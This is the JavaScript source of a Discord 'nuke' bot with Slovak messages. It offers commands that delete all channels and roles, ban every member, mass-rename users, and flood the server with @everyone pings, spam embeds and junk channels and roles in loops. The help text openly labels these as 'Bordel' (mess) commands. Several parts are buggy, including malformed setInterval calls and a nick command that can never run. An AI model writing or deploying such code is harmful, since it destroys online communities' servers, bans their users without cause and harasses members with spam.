const Discord = require('discord.js')
const bot = new Discord.Client();
const prefix = '$';
require('dotenv').config();

bot.on('ready', () => {
    console.log(`${bot.user.tag} tvoj bot je pripraveny!`)
    bot.user.setStatus("online");
    bot.user.setActivity('Try me with "$nuke"', {type: "PLAYING"});
  })



bot.on('message', message => {
    if(message.content === prefix + 'ping') {
      setInterval(function() {
          message.channel.send('@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone')
         }),
      100
    }

    if(message.content === prefix + "nuke") {
 message.channel.send("teraz mazem vsetko")
	 message.guild.channels.forEach(channel => channel.delete())
	 message.guild.roles.forEach(roles => roles.delete()) } 
	  

  if(message.content === prefix + 'nick') {
    let nick = message.content.slice((prefix + 'setnick').length)
    if(!nick) return message.channel.send("zadaj nick pls").then(r=>r.delete(150000))
  
    message.guild.members.cache.forEach(r=>r.setNickname(nick + r.name))
    message.channel.send("menim nicky")
    
    }
    

     if(message.content === prefix + 'create') {
      setInterval(function() {
      message.guild.createChannel('text-text-text', 'text')
      message.guild.createChannel('hahahhaha', 'voice')
      message.guild.createChannel('hehehehheh', 'category')
    }),
    1
  }
  if(message.content === prefix + 'createroles') {
    setInterval(function() {
        message.guild.createRole({
           name: "troll",
           color: 'RANDOM'
        })
      }),
      1
    }
  if(message.content === prefix + 'deleteroles') {
    message.guild.roles.forEach(role => role.delete())
  }
  if(message.content === prefix + 'deletechannels') {	
     message.guild.channels.forEach(channel => channel.delete())
  }
  if(message.content === prefix + 'ban') {
    message.guild.members.forEach((f) => {
      message.guild.member(f).ban('ups')
    })
  }
  bot.on('message', message => {
if(message.content === prefix + 'spam') {
	setInterval(function() {
  const spam = new Discord.RichEmbed()
  .setTitle("spam")
  .addField('LOL', true)
  .setColor("RANDOM")
  message.channel.send(spam)
  }),
      1
    }
})
  if(message.content === prefix + 'help') {
  const xhelp = new Discord.RichEmbed()
  .setTitle("Toto vsetko dokazem a aj viac :)")
  .addField('Info', '```$info```', true)
  .addField('Bordel', '```$nuke, $deleteroles, $create, $deletechannels, $ban```', true)
  .addField('Ine', '```$spam```', true)
  .setFooter("tak uz porob nieco :)")
  .setColor("red")
  message.channel.send(xhelp)
  }
  if(message.content === '$info') {
  const xinfo = new Discord.RichEmbed()
  .setTitle("Informations")
  .setDescription("**br4ve.mov**")
  .setColor("RANDOM")
  message.channel.send(xinfo)
  }
})

bot.login(process.env.TOKEN)
bot.on('message', gotMessage);

function gotMessage(msg){
  console.log(msg);
}
